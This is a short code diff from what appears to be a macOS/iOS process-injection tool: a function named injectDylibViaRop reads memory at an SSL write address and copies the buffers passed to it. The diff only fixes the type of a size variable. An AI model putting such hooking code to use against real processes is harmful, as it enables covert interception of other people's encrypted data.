@@ -506,7 +506,7 @@ void injectDylibViaRop(task_t task, pid_t pid, const char* dylibPath, vm_address
 		
 		// 2. Save original instruction (ARM64 = 4 bytes)
 		uint32_t original_insn = 0;
-		mach_msg_type_number_t read_size = 4;
+		vm_size_t read_size = 4;
 		kr = vm_read_overwrite(task, sslWriteAddr, 4, 
 		                      (vm_address_t)&original_insn, &read_size);
 		if (kr == KERN_SUCCESS) {
@@ -602,7 +602,7 @@ void injectDylibViaRop(task_t task, pid_t pid, const char* dylibPath, vm_address
 				if (buf_ptr && buf_len > 0 && buf_len < 16384) {
 					char *buffer = malloc(buf_len + 1);
 					if (buffer) {
-					mach_msg_type_number_t read_size = buf_len;
+					vm_size_t read_size = buf_len;
 					kr = vm_read_overwrite(task, buf_ptr, buf_len,
 					                      (vm_address_t)buffer, &read_size);
 						if (kr == KERN_SUCCESS) {
